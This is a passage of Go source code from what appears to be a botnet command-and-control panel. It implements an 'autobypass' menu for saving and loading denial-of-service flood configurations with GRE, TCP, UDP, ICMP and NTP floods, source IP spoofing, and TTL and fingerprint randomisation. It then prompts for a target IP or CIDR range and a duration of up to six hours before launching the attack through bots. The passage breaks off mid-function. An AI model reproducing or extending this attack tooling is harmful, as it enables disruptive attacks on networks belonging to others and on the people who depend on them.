package main
import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)
const autobypassConfigDir = "configs/autobypass"
func ensureAutobypassDir() error {
	if err := os.MkdirAll(autobypassConfigDir, 0755); err != nil {
		return fmt.Errorf("failed to create config directory: %v", err)
	}
	return nil
}
type AutobypassConfig struct {
	Name      string
	Protocols []string
	Port      int
	Threads   int
	Size      int
	TTL       int
	TOS       int
	UseRawSocket    bool
	BindToDevice    string
	SendBufferSize  int
	SourceIPMode    string 
	SourceIPStart   string
	SourceIPEnd     string
	IPIDMode        string 
	DFFlag          bool   
	MoreFragments   bool
	FragmentOffset  int
	TCPMSS          int    
	TCPWindowSize   int
	TCPWindowScale  int
	TCPSACK         bool   
	TCPTimestamps   bool
	TCPNOP          int    
	UDPSourcePort   int    
	SeqRandomize    bool
	AckRandomize    bool
	PPS             int    
	BPS             int    
	BurstSize       int
	PayloadMode     string 
	PayloadPattern  string
	PayloadRepeat   int
	OSFingerprint   string 
	TTLRandomize    bool
	TTLMin          int
	TTLMax          int
	PortRandomize   bool
	PortMin         int
	PortMax         int
	TCPFlagsCustom  string 
	TCPFlagsMode    string 
	InterPacketDelay int    
	Jitter            int    
	PacketOrdering    string 
	BurstPattern      string 
	SizeRandomize    bool
	SizeMin          int
	SizeMax          int
	SourcePortRandomize bool
	SourcePortMin       int
	SourcePortMax       int
	SeqPattern       string 
	AckPattern       string 
	SeqIncrement     int    
	AckIncrement     int    
	IPPrecedence     int    
	DSCP             int    
	ECN              bool   
	TCPUrgentPtr     int    
	WindowRandomize   bool
	WindowMin         int
	WindowMax         int
	MSSRandomize      bool
	MSSMin            int
	MSSMax            int
	Keepalive         bool
	KeepaliveInterval int   
	RetryCount        int
	ConnectionTimeout int   
	CongestionControl string 
	Created         time.Time
}
func (this *Admin) handleAutobypassMenu(username string, userInfo AccountInfo, botCount int, botCatagory string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              AUTOBYPASS CONFIGURATION MENU                    \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m1\x1b[0m - Create new configuration                              \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m2\x1b[0m - Load saved configuration                              \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m3\x1b[0m - List saved configurations                           \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m4\x1b[0m - View configuration details                          \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m5\x1b[0m - Edit configuration                                   \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m6\x1b[0m - Copy configuration                                   \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m7\x1b[0m - Delete configuration                                 \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m8\x1b[0m - Quick launch (default settings)                      \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m9\x1b[0m - Load preset configurations                          \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36ma\x1b[0m - Search configurations                                \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mb\x1b[0m - Export/Import configurations                        \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mc\x1b[0m - Validate configuration                              \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m0\x1b[0m - Back to main menu                                   \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte("\r\n\x1b[1;33mSelect option: \x1b[0m"))
	choice, err := this.ReadLine(false)
	if err != nil {
		return
	}
	switch strings.TrimSpace(choice) {
	case "1":
		this.createAutobypassConfig(username, userInfo, botCount, botCatagory)
	case "2":
		this.loadAutobypassConfig(username, userInfo, botCount, botCatagory)
	case "3":
		this.listAutobypassConfigs()
		time.Sleep(3 * time.Second)
	case "4":
		this.viewAutobypassConfig()
	case "5":
		this.editAutobypassConfig(username, userInfo, botCount, botCatagory)
	case "6":
		this.copyAutobypassConfig()
	case "7":
		this.deleteAutobypassConfig()
	case "8":
		this.quickLaunchAutobypass(username, userInfo, botCount, botCatagory)
	case "9":
		this.loadPresetConfig(username, userInfo, botCount, botCatagory)
	case "a", "A":
		this.searchAutobypassConfigs()
	case "b", "B":
		this.exportImportConfigs()
	case "c", "C":
		this.validateAutobypassConfig()
	case "0":
		return
	default:
		this.conn.Write([]byte("\x1b[1;31mInvalid option\r\n"))
		time.Sleep(1 * time.Second)
	}
}
func (this *Admin) createAutobypassConfig(username string, userInfo AccountInfo, botCount int, botCatagory string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              CREATE AUTOBYPASS CONFIGURATION                 \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	config := AutobypassConfig{
		Protocols: []string{},
		Port:      80,
		Threads:   128,
		Size:      512,
		TTL:       64,
		TOS:       0,
		UseRawSocket:    false,
		BindToDevice:    "",
		SendBufferSize:  4194304,
		SourceIPMode:    "real",
		SourceIPStart:   "",
		SourceIPEnd:     "",
		IPIDMode:        "random",
		DFFlag:          false,
		MoreFragments:   false,
		FragmentOffset:  0,
		TCPMSS:          1460,
		TCPWindowSize:   65535,
		TCPWindowScale:  0,
		TCPSACK:         false,
		TCPTimestamps:   false,
		TCPNOP:          0,
		UDPSourcePort:   0,
		SeqRandomize:    true,
		AckRandomize:    true,
		PPS:             0,
		BPS:             0,
		BurstSize:       100,
		PayloadMode:     "random",
		PayloadPattern:  "",
		PayloadRepeat:   1,
		OSFingerprint:   "random",
		TTLRandomize:    false,
		TTLMin:          64,
		TTLMax:          64,
		PortRandomize:   false,
		PortMin:         80,
		PortMax:         80,
		TCPFlagsCustom:  "",
		TCPFlagsMode:    "random",
		InterPacketDelay: 0,
		Jitter:           0,
		PacketOrdering:   "sequential",
		BurstPattern:     "linear",
		SizeRandomize:    false,
		SizeMin:          512,
		SizeMax:          512,
		SourcePortRandomize: false,
		SourcePortMin:       1024,
		SourcePortMax:       65535,
		SeqPattern:      "random",
		AckPattern:      "random",
		SeqIncrement:    1,
		AckIncrement:    1,
		IPPrecedence:    0,
		DSCP:            0,
		ECN:             false,
		TCPUrgentPtr:    0,
		WindowRandomize:  false,
		WindowMin:        65535,
		WindowMax:        65535,
		MSSRandomize:     false,
		MSSMin:           1460,
		MSSMax:           1460,
		Keepalive:        false,
		KeepaliveInterval: 60,
		RetryCount:       3,
		ConnectionTimeout: 5000,
		CongestionControl: "random",
		Created:         time.Now(),
	}
	this.conn.Write([]byte("\x1b[1;36mConfiguration name: \x1b[0m"))
	this.conn.Write([]byte("\x1b[2;37m(hint: use descriptive names like 'power_tcp' or 'stealth_udp', or press Enter for auto-name)\x1b[0m\r\n"))
	name, err := this.ReadLine(false)
	if err != nil {
		return
	}
	config.Name = strings.TrimSpace(name)
	if config.Name == "" {
		config.Name = fmt.Sprintf("config_%d", time.Now().Unix())
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33mUsing auto-generated name: %s\r\n", config.Name)))
	}
	if existingConfig := this.readAutobypassConfig(config.Name); existingConfig != nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration with this name already exists. Overwrite? (y/n): \x1b[0m"))
		overwrite, _ := this.ReadLine(false)
		if strings.ToLower(strings.TrimSpace(overwrite)) != "y" {
			this.conn.Write([]byte("\x1b[1;33mCancelled\r\n"))
			time.Sleep(2 * time.Second)
			return
		}
	}
	this.conn.Write([]byte("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              SELECT PROTOCOLS                                 \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m1\x1b[0m - GRE IP      \x1b[1;33m[ ]\x1b[0m  \x1b[1;36m2\x1b[0m - GRE ETH     \x1b[1;33m[ ]\x1b[0m  \x1b[1;36m3\x1b[0m - TCP SYN     \x1b[1;33m[ ]\x1b[0m  \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m4\x1b[0m - TCP ACK      \x1b[1;33m[ ]\x1b[0m  \x1b[1;36m5\x1b[0m - TCP ALL      \x1b[1;33m[ ]\x1b[0m  \x1b[1;36m6\x1b[0m - UDP          \x1b[1;33m[ ]\x1b[0m  \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m7\x1b[0m - TCP          \x1b[1;33m[ ]\x1b[0m  \x1b[1;36m8\x1b[0m - TCP FRAG     \x1b[1;33m[ ]\x1b[0m  \x1b[1;36m9\x1b[0m - TCP BYPASS   \x1b[1;33m[ ]\x1b[0m  \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36ma\x1b[0m - ICE          \x1b[1;33m[ ]\x1b[0m  \x1b[1;36mb\x1b[0m - ICMP         \x1b[1;33m[ ]\x1b[0m  \x1b[1;36mc\x1b[0m - NTP          \x1b[1;33m[ ]\x1b[0m  \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m*\x1b[0m - Select ALL   \x1b[1;36mdone\x1b[0m - Finish selection                          \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	protocolMap := map[string]string{
		"1": "greip", "2": "greeth", "3": "tcpsyn", "4": "tcpack",
		"5": "tcpall", "6": "udp", "7": "tcp", "8": "tcpfrag",
		"9": "tcpbypass", "a": "ice", "b": "icmp", "c": "ntp",
	}
	selected := make(map[string]bool)
	for {
		this.showProtocolSelection(selected, protocolMap)
		this.conn.Write([]byte("\x1b[1;33mSelect protocol (or 'done' to finish): \x1b[0m"))
		choice, err := this.ReadLine(false)
		if err != nil {
			return
		}
		choice = strings.ToLower(strings.TrimSpace(choice))
		if choice == "done" {
			break
		}
		if choice == "*" {
			for _, proto := range protocolMap {
				selected[proto] = true
			}
			this.conn.Write([]byte("\x1b[1;32mAll protocols selected\r\n"))
			break
		}
		if proto, ok := protocolMap[choice]; ok {
			selected[proto] = !selected[proto]
		} else {
			this.conn.Write([]byte("\x1b[1;31mInvalid choice\r\n"))
			time.Sleep(500 * time.Millisecond)
		}
	}
	for proto, enabled := range selected {
		if enabled {
			config.Protocols = append(config.Protocols, proto)
		}
	}
	if len(config.Protocols) == 0 {
		config.Protocols = []string{"all"}
	}
	this.conn.Write([]byte("\r\n\x1b[1;36mPort (default 80): \x1b[0m"))
	portStr, _ := this.ReadLine(false)
	if portStr != "" {
		if p, err := strconv.Atoi(strings.TrimSpace(portStr)); err == nil && p > 0 && p < 65536 {
			config.Port = p
		} else {
			this.conn.Write([]byte("\x1b[1;31mInvalid port, using default 80\r\n"))
		}
	}
	this.conn.Write([]byte("\x1b[1;36mThreads (default 128): \x1b[0m"))
	threadsStr, _ := this.ReadLine(false)
	if threadsStr != "" {
		if t, err := strconv.Atoi(strings.TrimSpace(threadsStr)); err == nil && t > 0 {
			config.Threads = t
		} else {
			this.conn.Write([]byte("\x1b[1;31mInvalid threads, using default 128\r\n"))
		}
	}
	this.conn.Write([]byte("\x1b[1;36mPacket size (default 512): \x1b[0m"))
	sizeStr, _ := this.ReadLine(false)
	if sizeStr != "" {
		if s, err := strconv.Atoi(strings.TrimSpace(sizeStr)); err == nil && s > 0 {
			config.Size = s
		} else {
			this.conn.Write([]byte("\x1b[1;31mInvalid size, using default 512\r\n"))
		}
	}
	this.conn.Write([]byte("\x1b[1;36mTTL (default 64): \x1b[0m"))
	ttlStr, _ := this.ReadLine(false)
	if ttlStr != "" {
		if t, err := strconv.Atoi(strings.TrimSpace(ttlStr)); err == nil && t > 0 && t < 256 {
			config.TTL = t
		} else {
			this.conn.Write([]byte("\x1b[1;31mInvalid TTL, using default 64\r\n"))
		}
	}
	this.conn.Write([]byte("\x1b[1;36mTOS (default 0): \x1b[0m"))
	tosStr, _ := this.ReadLine(false)
	if tosStr != "" {
		if t, err := strconv.Atoi(strings.TrimSpace(tosStr)); err == nil && t >= 0 && t < 256 {
			config.TOS = t
		} else {
			this.conn.Write([]byte("\x1b[1;31mInvalid TOS, using default 0\r\n"))
		}
	}
	this.conn.Write([]byte("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              ADVANCED SETTINGS (Optional)                      \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m1\x1b[0m - Raw Socket Settings                                \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m2\x1b[0m - Source IP Spoofing                                 \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m3\x1b[0m - IP Header Options                                  \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m4\x1b[0m - TCP Options                                        \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m5\x1b[0m - UDP Options                                        \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m6\x1b[0m - Rate Limiting                                      \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m7\x1b[0m - Payload Options                                    \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m8\x1b[0m - OS Fingerprinting                                   \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m9\x1b[0m - Advanced Bypass                                    \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36ma\x1b[0m - TCP Flags & Sequencing                              \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mb\x1b[0m - Packet Timing & Ordering                           \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mc\x1b[0m - Size & Port Randomization                           \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36md\x1b[0m - IP QoS & Advanced Options                           \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m0\x1b[0m - Skip (use defaults)                                 \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte("\r\n\x1b[1;33mConfigure advanced settings? (0-9, a-d, or 'all' for all): \x1b[0m"))
	advChoice, _ := this.ReadLine(false)
	advChoice = strings.ToLower(strings.TrimSpace(advChoice))
	if advChoice == "all" {
		this.configureAdvancedSettings(&config, "1")
		this.configureAdvancedSettings(&config, "2")
		this.configureAdvancedSettings(&config, "3")
		this.configureAdvancedSettings(&config, "4")
		this.configureAdvancedSettings(&config, "5")
		this.configureAdvancedSettings(&config, "6")
		this.configureAdvancedSettings(&config, "7")
		this.configureAdvancedSettings(&config, "8")
		this.configureAdvancedSettings(&config, "9")
		this.configureAdvancedSettings(&config, "a")
		this.configureAdvancedSettings(&config, "b")
		this.configureAdvancedSettings(&config, "c")
		this.configureAdvancedSettings(&config, "d")
	} else if advChoice != "0" {
		this.configureAdvancedSettings(&config, advChoice)
	}
	if err := this.saveAutobypassConfig(config); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;31mError saving configuration: %s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║\x1b[1;97m              CONFIGURATION SUMMARY                              \x1b[1;95m║\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mName:     \x1b[1;33m%-50s\x1b[1;95m║\r\n", config.Name)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mProtocols: \x1b[1;33m%-48s\x1b[1;95m║\r\n", strings.Join(config.Protocols, ", "))))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mPort:     \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.Port)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mThreads:  \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.Threads)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mSize:     \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.Size)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mTTL:      \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.TTL)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mTOS:      \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.TOS)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n")))
	this.conn.Write([]byte("\x1b[1;33mLaunch attack now? (y/n): \x1b[0m"))
	launch, _ := this.ReadLine(false)
	if strings.ToLower(strings.TrimSpace(launch)) == "y" {
		this.conn.Write([]byte("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              LAUNCH ATTACK                                     \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mTarget IP/Domain: \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: enter IP address like 1.2.3.4, domain like example.com, or CIDR like 1.2.3.0/24)\x1b[0m\r\n"))
		target, err := this.ReadLine(false)
		if err != nil {
			return
		}
		target = strings.TrimSpace(target)
		if target == "" {
			this.conn.Write([]byte("\x1b[1;31mTarget cannot be empty\r\n"))
			time.Sleep(2 * time.Second)
			return
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mDuration (seconds, 1-21600): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: 60=1min, 300=5min, 600=10min, 3600=1hour, max 21600=6hours)\x1b[0m\r\n"))
		durationStr, err := this.ReadLine(false)
		if err != nil {
			return
		}
		duration, err := strconv.Atoi(strings.TrimSpace(durationStr))
		if err != nil {
			this.conn.Write([]byte("\x1b[1;31mInvalid duration\r\n"))
			time.Sleep(2 * time.Second)
			return
		}
		if duration < 1 || duration > 21600 {
			this.conn.Write([]byte("\x1b[1;31mDuration must be between 1 and 21600 seconds\r\n"))
			time.Sleep(2 * time.Second)
			return
		}
		cmdPreview := this.previewCommand(config, target, duration)
		this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n")))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║\x1b[1;97m              COMMAND PREVIEW                                 \x1b[1;95m║\r\n")))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n")))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;33m%s\x1b[1;95m║\r\n", cmdPreview)))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n")))
		this.conn.Write([]byte("\x1b[1;33m🚀 Launch attack? (y/n): \x1b[0m"))
		confirm, _ := this.ReadLine(false)
		if strings.ToLower(strings.TrimSpace(confirm)) != "y" {
			this.conn.Write([]byte("\x1b[1;33mAttack cancelled\r\n"))
			time.Sleep(2 * time.Second)
			return
		}
		this.launchAutobypass(config, username, userInfo, botCount, botCatagory, target, duration)
	}
	time.Sleep(2 * time.Second)
}
func (this *Admin) showProtocolSelection(selected map[string]bool, protocolMap map[string]string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              SELECT PROTOCOLS                                 \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	protoNames := []string{"greip", "greeth", "tcpsyn", "tcpack", "tcpall", "udp", "tcp", "tcpfrag", "tcpbypass", "ice", "icmp", "ntp"}
	protoKeys := []string{"1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c"}
	protoLabels := []string{"GRE IP", "GRE ETH", "TCP SYN", "TCP ACK", "TCP ALL", "UDP", "TCP", "TCP FRAG", "TCP BYPASS", "ICE", "ICMP", "NTP"}
	for i := 0; i < len(protoNames); i += 3 {
		line := "\x1b[1;95m║"
		for j := i; j < i+3 && j < len(protoNames); j++ {
			status := "\x1b[1;31m[ ]"
			if selected[protoNames[j]] {
				status = "\x1b[1;32m[✓]"
			}
			line += fmt.Sprintf(" \x1b[1;36m%s\x1b[0m - %-12s %s", protoKeys[j], protoLabels[j], status)
		}
		line += " \x1b[1;95m║\r\n"
		this.conn.Write([]byte(line))
	}
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m*\x1b[0m - Select ALL   \x1b[1;36mdone\x1b[0m - Finish selection                          \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	selectedList := []string{}
	for proto, enabled := range selected {
		if enabled {
			selectedList = append(selectedList, proto)
		}
	}
	if len(selectedList) > 0 {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mSelected: %s\r\n\r\n", strings.Join(selectedList, ", "))))
	}
}
func (this *Admin) saveAutobypassConfig(config AutobypassConfig) error {
	if err := ensureAutobypassDir(); err != nil {
		return err
	}
	filePath := filepath.Join(autobypassConfigDir, config.Name+".txt")
	content := fmt.Sprintf("name=%s\n", config.Name)
	content += fmt.Sprintf("protocols=%s\n", strings.Join(config.Protocols, ","))
	content += fmt.Sprintf("port=%d\n", config.Port)
	content += fmt.Sprintf("threads=%d\n", config.Threads)
	content += fmt.Sprintf("size=%d\n", config.Size)
	content += fmt.Sprintf("ttl=%d\n", config.TTL)
	content += fmt.Sprintf("tos=%d\n", config.TOS)
	content += fmt.Sprintf("rawsocket=%t\n", config.UseRawSocket)
	content += fmt.Sprintf("binddev=%s\n", config.BindToDevice)
	content += fmt.Sprintf("sndbuf=%d\n", config.SendBufferSize)
	content += fmt.Sprintf("srcmode=%s\n", config.SourceIPMode)
	content += fmt.Sprintf("srcstart=%s\n", config.SourceIPStart)
	content += fmt.Sprintf("srcend=%s\n", config.SourceIPEnd)
	content += fmt.Sprintf("ipidmode=%s\n", config.IPIDMode)
	content += fmt.Sprintf("df=%t\n", config.DFFlag)
	content += fmt.Sprintf("mf=%t\n", config.MoreFragments)
	content += fmt.Sprintf("fragoff=%d\n", config.FragmentOffset)
	content += fmt.Sprintf("mss=%d\n", config.TCPMSS)
	content += fmt.Sprintf("win=%d\n", config.TCPWindowSize)
	content += fmt.Sprintf("wscale=%d\n", config.TCPWindowScale)
	content += fmt.Sprintf("sack=%t\n", config.TCPSACK)
	content += fmt.Sprintf("ts=%t\n", config.TCPTimestamps)
	content += fmt.Sprintf("nop=%d\n", config.TCPNOP)
	content += fmt.Sprintf("sport=%d\n", config.UDPSourcePort)
	content += fmt.Sprintf("seqrand=%t\n", config.SeqRandomize)
	content += fmt.Sprintf("ackrand=%t\n", config.AckRandomize)
	content += fmt.Sprintf("pps=%d\n", config.PPS)
	content += fmt.Sprintf("bps=%d\n", config.BPS)
	content += fmt.Sprintf("burst=%d\n", config.BurstSize)
	content += fmt.Sprintf("payloadmode=%s\n", config.PayloadMode)
	content += fmt.Sprintf("payloadpat=%s\n", config.PayloadPattern)
	content += fmt.Sprintf("payloadrepeat=%d\n", config.PayloadRepeat)
	content += fmt.Sprintf("osfp=%s\n", config.OSFingerprint)
	content += fmt.Sprintf("ttlrand=%t\n", config.TTLRandomize)
	content += fmt.Sprintf("ttlmin=%d\n", config.TTLMin)
	content += fmt.Sprintf("ttlmax=%d\n", config.TTLMax)
	content += fmt.Sprintf("portrand=%t\n", config.PortRandomize)
	content += fmt.Sprintf("portmin=%d\n", config.PortMin)
	content += fmt.Sprintf("portmax=%d\n", config.PortMax)
	content += fmt.Sprintf("tcpflags=%s\n", config.TCPFlagsCustom)
	content += fmt.Sprintf("tcpflagsmode=%s\n", config.TCPFlagsMode)
	content += fmt.Sprintf("ipdelay=%d\n", config.InterPacketDelay)
	content += fmt.Sprintf("jitter=%d\n", config.Jitter)
	content += fmt.Sprintf("packetorder=%s\n", config.PacketOrdering)
	content += fmt.Sprintf("burstpat=%s\n", config.BurstPattern)
	content += fmt.Sprintf("sizerand=%t\n", config.SizeRandomize)
	content += fmt.Sprintf("sizemin=%d\n", config.SizeMin)
	content += fmt.Sprintf("sizemax=%d\n", config.SizeMax)
	content += fmt.Sprintf("sportrand=%t\n", config.SourcePortRandomize)
	content += fmt.Sprintf("sportmin=%d\n", config.SourcePortMin)
	content += fmt.Sprintf("sportmax=%d\n", config.SourcePortMax)
	content += fmt.Sprintf("seqpat=%s\n", config.SeqPattern)
	content += fmt.Sprintf("ackpat=%s\n", config.AckPattern)
	content += fmt.Sprintf("seqinc=%d\n", config.SeqIncrement)
	content += fmt.Sprintf("ackinc=%d\n", config.AckIncrement)
	content += fmt.Sprintf("ipprec=%d\n", config.IPPrecedence)
	content += fmt.Sprintf("dscp=%d\n", config.DSCP)
	content += fmt.Sprintf("ecn=%t\n", config.ECN)
	content += fmt.Sprintf("urgptr=%d\n", config.TCPUrgentPtr)
	content += fmt.Sprintf("winrand=%t\n", config.WindowRandomize)
	content += fmt.Sprintf("winmin=%d\n", config.WindowMin)
	content += fmt.Sprintf("winmax=%d\n", config.WindowMax)
	content += fmt.Sprintf("mssrand=%t\n", config.MSSRandomize)
	content += fmt.Sprintf("mssmin=%d\n", config.MSSMin)
	content += fmt.Sprintf("mssmax=%d\n", config.MSSMax)
	content += fmt.Sprintf("keepalive=%t\n", config.Keepalive)
	content += fmt.Sprintf("keepint=%d\n", config.KeepaliveInterval)
	content += fmt.Sprintf("retry=%d\n", config.RetryCount)
	content += fmt.Sprintf("timeout=%d\n", config.ConnectionTimeout)
	content += fmt.Sprintf("congestion=%s\n", config.CongestionControl)
	content += fmt.Sprintf("created=%s\n", config.Created.Format(time.RFC3339))
	if err := ioutil.WriteFile(filePath, []byte(content), 0644); err != nil {
		return fmt.Errorf("failed to save configuration: %v", err)
	}
	return nil
}
func (this *Admin) loadAutobypassConfig(username string, userInfo AccountInfo, botCount int, botCatagory string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              LOAD AUTOBYPASS CONFIGURATION                   \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	configs := this.listAutobypassConfigs()
	if len(configs) == 0 {
		this.conn.Write([]byte("\x1b[1;31mNo configurations found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\x1b[1;36mEnter configuration name or number: \x1b[0m"))
	nameOrNum, err := this.ReadLine(false)
	if err != nil {
		return
	}
	var config *AutobypassConfig
	nameOrNum = strings.TrimSpace(nameOrNum)
	if num, err := strconv.Atoi(nameOrNum); err == nil && num > 0 && num <= len(configs) {
		config = this.readAutobypassConfig(configs[num-1])
	} else {
		config = this.readAutobypassConfig(nameOrNum)
	}
	if config == nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration not found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32mConfiguration '%s' loaded!\r\n", config.Name)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mProtocols: %s\r\n", strings.Join(config.Protocols, ", "))))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mPort: %d | Threads: %d | Size: %d | TTL: %d | TOS: %d\r\n",
		config.Port, config.Threads, config.Size, config.TTL, config.TOS)))
